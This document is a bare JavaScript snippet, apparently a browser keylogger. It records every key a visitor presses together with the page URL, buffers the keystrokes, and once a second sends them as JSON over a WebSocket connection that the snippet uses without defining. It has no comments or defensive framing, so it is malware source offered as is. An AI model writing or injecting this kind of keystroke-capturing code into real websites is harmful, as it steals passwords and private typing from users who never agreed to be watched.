var buffer=[];
document.onkeypress = function(e) {
    var stroke = {
        k: e.key,
        href: window.location.href
    };
    buffer.push(stroke);
}

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = JSON.stringify(buffer);
        ws.send(data);
        buffer = [];
    }
}, 1000);
